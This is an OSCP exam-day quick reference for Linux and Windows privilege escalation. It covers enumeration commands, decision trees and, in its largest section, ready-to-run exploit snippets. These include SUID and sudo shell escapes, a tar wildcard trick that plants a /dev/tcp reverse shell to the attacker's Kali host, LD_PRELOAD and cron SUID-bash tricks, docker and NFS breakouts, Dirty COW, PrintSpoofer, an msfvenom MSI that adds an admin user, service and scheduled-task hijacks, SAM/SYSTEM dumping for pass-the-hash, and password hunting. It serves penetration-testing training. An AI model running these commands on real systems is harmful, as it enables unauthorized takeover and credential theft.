# OSCP Privilege Escalation – Exam-Day Quick Reference

> Kali as attacker. Targets: Linux or Windows. Prioritize manual methods. Use linPEAS/winPEAS to assist enumeration only. Record everything for the report.

---

## 0) How to use this sheet
1. Run **Initial Enum** for OS + user + quick wins.
2. Follow **Decision Trees** to pick the highest‑probability path.
3. Apply the **Category Checks** and **Exploit Snippets** that match your findings.
4. Capture **proof.txt/root.txt**. Note steps. Minimal cleanup if needed.

---

## 1) Initial Enumeration (10–15 min)

### Linux
```bash
whoami && id                     # User and groups (docker/lxd/adm/sudo=?)
hostname && pwd                  # Context
echo $SHELL; echo $PATH          # Shell + PATH
uname -a                         # Kernel/arch
cat /etc/issue || cat /etc/os-release  # Distro
sudo -l                          # Sudo rights (NOPASSWD? env_keep?)
ps -ef | head -20                # Quick processes scan
ss -tunlp || netstat -tunlp      # Listeners
ls -la /home /root /tmp          # Accessible dirs and loot
```
- Goal: user, groups, OS, kernel, sudo, obvious creds or writable paths.
- Optional: **linpeas.sh** in background for hints.

### Windows
```cmd
whoami /all                      & REM User, groups, enabled privileges
systeminfo                        & REM OS build/arch/patch baseline
echo %COMPUTERNAME% %USERNAME%
wmic os get caption,version,architecture
tasklist /v | more               & REM Processes
wmic service list brief | find "Running"
net localgroup administrators
reg query HKLM\...\Policies\System /v EnableLUA
```
- Goal: SeImpersonate/SeBackup present? Services? AlwaysInstallElevated? UAC?

---

## 2) Decision Trees

### Linux
1) **Sudo** shows NOPASSWD or escapable binary → exploit sudo first.  
2) Else **SUID/SGID unusual** (find/vim/nmap/custom) → try GTFOBins method.  
3) Else **Cron/systemd timers** writable or PATH abuse → hijack script/path.  
4) Else **Creds in files** → reuse with `su`/`ssh`/service logins.  
5) Else **Groups** docker/lxd → container breakout.  
6) Else **Capabilities** cap_setuid/cap_dac_* → leverage.  
7) Else **NFS no_root_squash** → SUID dropper.  
8) Else **Kernel LPE** (last resort) matching exact kernel.

### Windows
1) **SeImpersonate** → PrintSpoofer/RoguePotato variant for SYSTEM.  
2) Else **AlwaysInstallElevated** both HKCU/HKLM=1 → run MSI as SYSTEM.  
3) Else **Services**: weak bin perms, unquoted path, modifiable registry ImagePath → replace/hijack and start service.  
4) Else **Scheduled task** writable or triggerable → inject command, run.  
5) Else **SeBackup** → dump SAM+SYSTEM, extract hash, pass‑the‑hash.  
6) Else **Credentials** in files/registry → try Administrator/logons.  
7) Else **Kernel LPE** for specific build (risk of crash; use only if needed).

---

## 3) Category Checks (What to look for)

### Linux
- **SUID/SGID**: 
  ```bash
  find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
  find / -perm -2000 -type f -exec ls -l {} \; 2>/dev/null
  ```
- **Sudo**: `sudo -l` ⇒ NOPASSWD, editors, tar, env_keep, !secure_path.
- **Cron/timers**: 
  ```bash
  cat /etc/crontab; ls -la /etc/cron.* /etc/cron.d; crontab -l
  ```
- **Writable files/dirs**: `find / -writable -type f 2>/dev/null | head -n 100`
- **Capabilities**: `getcap -r / 2>/dev/null` (cap_setuid, cap_dac_*).
- **Groups**: `id` → docker/lxd.  
- **NFS**: `cat /etc/exports` (no_root_squash).  
- **Kernel**: `uname -r; lsb_release -a; which gcc`.

### Windows
- **Privileges**: `whoami /priv` → SeImpersonate/SeBackup/SeDebug.  
- **Services**: 
  ```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /v "C:\Windows"
  sc qc <ServiceName>   & REM Inspect path
  icacls "C:\path\to\service.exe"
  ```
- **AlwaysInstallElevated**:  
  ```cmd
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
- **Tasks**: `schtasks /Query /FO LIST /V > tasks.txt`
- **Creds in files**:  
  ```cmd
  findstr /SIM "password passwd Pwd" C:\Users\ %PROGRAMDATA% 2>NUL
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
  ```

---

## 4) Exploit Snippets (Use exact scenario)

### Linux – SUID / Sudo / Cron / Capabilities / Containers / NFS / Kernel

**SUID find → root shell**
```bash
find /etc/passwd -exec /bin/sh \;
# find -exec runs /bin/sh as file owner (root) when find is SUID-root.
```

**SUID nmap (<5.21)**
```bash
nmap --interactive
# at prompt: !sh
```

**SUID vim**
```bash
vim -c ':set shell=/bin/bash|shell'
# Run shell from vim; inherits root via SUID.
```

**Sudo tar wildcard**
```bash
cd /opt
echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' > shell.sh
echo "" > "--checkpoint=1"
echo "--checkpoint-action=exec=sh shell.sh" > "--checkpoint-action=exec=sh shell.sh"
sudo /bin/tar -cf backup.tar *
# File names become tar options; executes shell.sh as root.
```

**Sudo less escape**
```bash
sudo less /var/log/auth.log
# inside less: !sh
```

**Sudo with LD_PRELOAD (env preserved)**
```bash
# Compile malicious .so (constructor spawns /bin/bash)
sudo LD_PRELOAD=/tmp/shell.so -E /bin/true
```

**Cron writable script → SUID bash**
```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' | sudo tee /usr/local/bin/backup.sh
# Wait for cron, then:
/tmp/rootbash -p
```

**Capabilities: python cap_setuid**
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Docker group breakout**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

**NFS no_root_squash**
```bash
# On Kali after mounting share:
cat > /mnt/root.c <<'EOF'
#include <unistd.h>
#include <stdlib.h>
int main(){ setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc /mnt/root.c -o /mnt/rootme && chmod +s /mnt/rootme
# On target:
/export/rootme
```

**Kernel LPE (example Dirty COW)**
```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty secret123 && su firefart
```

---

### Windows – Tokens / MSI / Services / Tasks / Backup / DLL / Kernel

**SeImpersonate → PrintSpoofer**
```cmd
PrintSpoofer.exe -i -c cmd
# Spawns SYSTEM cmd using impersonation.
```

**AlwaysInstallElevated → MSI as SYSTEM**
```bash
msfvenom -p windows/adduser USER=hacker PASS=Passw0rd! -f msi-nouac -o evil.msi
# Transfer then on target:
msiexec /quiet /qn /i C:\path\evil.msi
```

**Service binary replacement (weak ACL)**
```cmd
sc stop VulnService
move "C:\Program Files\Vuln\service.exe" "C:\Program Files\Vuln\service.exe.bak"
copy C:\Users\Public\hijack.exe "C:\Program Files\Vuln\service.exe"
sc start VulnService
```

**Unquoted service path hijack**
```cmd
copy C:\Users\Public\payload.exe C:\Program.exe
sc start <VulnerableService>
```

**Service ImagePath via registry (writable key)**
```powershell
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService" -Name ImagePath -Value "C:\Users\Public\payload.exe"
sc start VulnService
```

**SeBackupPrivilege → dump SAM/SYSTEM → PTH**
```cmd
reg save HKLM\SAM C:\Users\Public\SAM.backup
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM.backup
# Extract hashes on Kali, then psexec.py with NTLM hash.
```

**Scheduled task hijack**
```cmd
echo net localgroup administrators %USERNAME% /add >> C:\Scripts\backup.bat
schtasks /Run /TN "NightlyBackup"
```

**DLL hijack (missing DLL in writable dir)**
```text
Compile malicious crypto.dll, drop to target path, restart service.
```

**Kernel LPE (only if needed)**
```text
Pick exploit matching build (e.g., MS16-032 for older systems). Risk: BSOD.
```

---

## 5) Credential Hunting Shortlist
- Linux: `/var/www`, `/etc/*conf*`, `.bash_history`, `.ssh/`, process args in `ps aux`, DB configs.  
- Windows: `unattend.xml`, app configs in `ProgramData`, Winlogon AutoAdminLogon, browser/RDP managers, `%APPDATA%` files.

---

## 6) Post‑Exploitation
- Grab proofs. Note commands and rationale.  
- Optional cleanup: remove droppers, restore paths/registry, delete created users, clear obvious artifacts. Avoid risky log wiping in exam.

---

## 7) Final Checklist
- [ ] whoami/id or whoami /all; OS version; quick wins noted.  
- [ ] Linux: sudo, SUID, cron, creds, groups, caps, NFS, kernel.  
- [ ] Windows: SeImpersonate, AlwaysInstallElevated, services, tasks, SeBackup, creds, kernel.  
- [ ] Chosen path executed; root/SYSTEM confirmed.  
- [ ] Proofs captured; steps recorded.
